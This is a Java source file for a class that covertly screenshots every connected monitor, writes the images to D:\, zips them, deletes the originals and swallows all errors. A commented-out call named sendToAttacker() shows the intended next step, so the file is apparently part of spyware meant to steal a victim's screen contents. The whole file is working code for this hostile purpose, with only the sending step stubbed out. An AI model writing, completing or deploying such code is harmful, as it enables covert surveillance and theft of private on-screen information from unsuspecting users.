package it.justDo.misc;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Date;

public class ScreenCapture {

    private static final String PREFIX = "capture";
    private static final String IMAGE_FORMAT = "jpg";

    private static final String FILE_PATTERN = ".+" + PREFIX + "_[0-9]+_[0-9]+\\." + IMAGE_FORMAT;
    private static final String DESTINATION = "D:\\";
    private static final String ZIP_FILE = PREFIX + ".zip";
    private static final int SEARCH_DEPTH = 1;
    private static int ID = 1;

    public ScreenCapture() throws InterruptedException, AWTException, IOException {
        this(0);
    }

    public ScreenCapture(int delay) throws InterruptedException, AWTException, IOException {
        Thread.sleep(delay);
        captureAllMonitors();
        packAndSend();
    }

    public static void main(String[] args) {
        try {
            new ScreenCapture();
        } catch (InterruptedException | IOException | AWTException e) {
//            e.printStackTrace();
        }
    }

    private static String getMilliseconds() {
        return Long.toString(new Date().getTime());
    }

    private void captureAllMonitors() throws IOException, AWTException {
        GraphicsEnvironment graphicsEnvironment = GraphicsEnvironment.getLocalGraphicsEnvironment();
        GraphicsDevice[] screenDevices = graphicsEnvironment.getScreenDevices();
        iterateAllDevices(screenDevices);
    }

    private void iterateAllDevices(GraphicsDevice[] screenDevices) throws IOException, AWTException {
        for (GraphicsDevice device : screenDevices) {
            iterateAllMonitors(device);
        }
    }

    private void iterateAllMonitors(GraphicsDevice device) throws IOException, AWTException {
        GraphicsConfiguration[] configurations = device.getConfigurations();
        for (GraphicsConfiguration monitor : configurations) {
            captureAndSave(monitor.getBounds());
        }
    }

    private void captureAndSave(Rectangle bounds) throws IOException, AWTException {
        Robot robot = new Robot();
        BufferedImage image = robot.createScreenCapture(bounds);
        saveImage(image);
    }

    private void saveImage(BufferedImage image) throws IOException {
        File path = new File(getNewPath());
        ImageIO.write(image, IMAGE_FORMAT, path);
    }

    @Deprecated
    private Rectangle getSingleScreen() {
        return new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
    }

    private String getNewPath() {
        return DESTINATION + PREFIX + "_" + getMilliseconds() + "_" + (ID++) + "." + IMAGE_FORMAT;
    }

    private void packAndSend() throws IOException {
        final String[] images = getCapturedImages();
        pack(images);
        remove(images);
//        sendToAttacker();
    }

    private void pack(String[] images) throws IOException {
        ZipApi zipApi = new ZipApi(DESTINATION + ZIP_FILE);
        zipApi.pack(images);
        zipApi.close();
    }

    private String[] getCapturedImages() throws IOException {
        return Files.walk(Paths.get(DESTINATION), SEARCH_DEPTH)
                .map(Path::toString)
                .filter(s -> s.matches(FILE_PATTERN))
                .toArray(String[]::new);
    }

    private void remove(String[] images) {
        for (String file : images) {
            new File(file).delete();
        }
    }
}
